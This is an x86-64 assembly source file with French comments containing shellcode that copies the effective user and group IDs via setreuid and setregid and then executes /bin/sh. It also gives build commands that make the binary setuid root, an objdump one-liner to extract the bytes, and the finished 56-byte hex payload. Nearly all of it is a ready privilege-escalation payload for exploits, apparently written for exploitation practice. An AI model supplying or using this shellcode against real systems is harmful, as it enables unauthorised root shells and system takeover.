global _start

_start:
	xor rax,rax
 
	; remplacer e par r si ne fonctionne pas et remettre le xor rax,rax


	; geteuid pour avoir l'utilisateur courant éxécutant le programme

	mov al, 107
	syscall

	; setreuid pour utiliser l'utilisateur courant du programme 

	mov edi,eax 
	xor rax,rax 
	mov esi,edi 
	
	mov al, 113
	syscall

	; getegid pour avoir le groupe courant éxécutant le programme 
	
	mov al,108
	syscall

	; setregid pour utiliser le groupe courant du programme 
	 
	
	mov edi,eax
	xor rax,rax
	mov esi,edi

	mov al,114
	syscall

	; exercve

	xor esi,esi
	mul esi
	mov rdi,'//bin/sh'

	push rax 
	push rdi
         
	;push dword 'n/sh'
	;push dword '//bi'

	mov rdi, rsp
	
	mov al, 59
	syscall

; shellcode 32 bits généric il utilise seteuid et setegid avec un get pour avoir ceux du 
; fichier source 
;nasm -f elf64 shellcode_generic_2.asm && ld shellcode_generic_2.o -o shellcode_generic_2 -m elf_x86_64 && sudo chown  root ./shellcode_generic_2 && sudo chgrp root ./shellcode_generic_2 && sudo chmod +x ./shellcode_generic_2 && sudo chmod +s ./shellcode_generic_2 && ./shellcode_generic_2 

;for i in $(objdump -d ./shellcode_generic_2 -M intel | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo


; hexa : \x48\x31\xc0\xb0\x6b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xfe\xb0\x71\x0f\x05\xb0\x6c\x0f\x05\x89\xc7\x48\x31\xc0\x89\xfe\xb0\x72\x0f\x05\x31\xf6\xf7\xe6\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50\x57\x48\x89\xe7\xb0\x3b\x0f\x05


; 56 bytes